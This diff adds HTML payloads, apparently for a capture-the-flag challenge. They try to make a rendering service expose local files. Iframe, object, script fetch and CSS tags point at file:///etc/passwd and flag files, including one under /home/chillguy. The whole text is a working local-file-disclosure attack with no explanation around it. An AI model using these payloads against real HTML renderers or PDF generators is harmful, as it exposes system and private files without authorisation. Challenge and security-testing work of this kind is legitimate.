@@ -1,1 +1,16 @@
 <iframe src="file:///etc/passwd" width="1000" height="1000"></iframe>
+<object data="file:///etc/passwd" type="text/plain" width="1000" height="1000">
+</object>
+<script>
+fetch('file:///etc/passwd')
+  .then(response => response.text())
+  .then(data => document.body.innerHTML = data);
+</script>
+<style>
+body {
+    background-image: url('file:///etc/passwd');
+}
+</style>
+<iframe src="file:///etc/passwd" width="1000" height="1000"></iframe>
+<iframe src="file:///flag.txt" width="1000" height="1000"></iframe>
+<iframe src="file:///home/chillguy/flag.txt" width="1000" height="1000"></iframe>
